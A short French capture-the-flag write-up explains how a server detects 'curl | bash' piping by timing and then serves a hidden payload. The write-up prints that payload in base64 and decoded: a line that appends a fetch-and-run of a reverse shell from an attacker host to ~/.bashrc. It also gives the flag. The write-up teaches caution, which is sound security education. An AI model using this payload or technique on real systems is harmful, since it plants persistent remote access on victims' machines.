# Solve

Il faut voir dans le challenge que le site agit différement si on arrive avec curl ou wget.

Par ailleurs, il faut voir aussi que quand on est pipé dans bash, le serveur arrive à le déterminer grâce au `sleep 2`, et dans ces cas là envoi la payload.

Pour voir cela, il est possible de démarrer un docker ubuntu et d'installer curl.

On exécute ensuite la commande `curl https://dockerinstall.ctf.bzh | bash`, pour voir le traffic on peut utiliser wireshark, et on voit que dans le script de réponse il y a une payload en base64 :

```sh
[...]
echo "ZWNobyAid2dldCBodHRwczovL2F0dGFja2VyLmJyZWl6aGN0Zi9yZXZlcnNlX3NoZWxsIHwgYmFzaCIgPj4gfi8uYmFzaHJjCmVjaG8gIkJaSENURntiM19jNHIzZnVsX3doMWwzX3AxcDFuZ18xbl9iNHNofSIgPiAvZGV2L251bGw=" | base64 -d | bash
[...]
```

On déchiffre la base64 :

```
echo "wget https://attacker.breizhctf/reverse_shell | bash" >> ~/.bashrc
echo "BZHCTF{b3_c4r3ful_wh1l3_p1p1ng_1n_b4sh}" > /dev/null
```

# Flag

BZHCTF{b3_c4r3ful_wh1l3_p1p1ng_1n_b4sh}
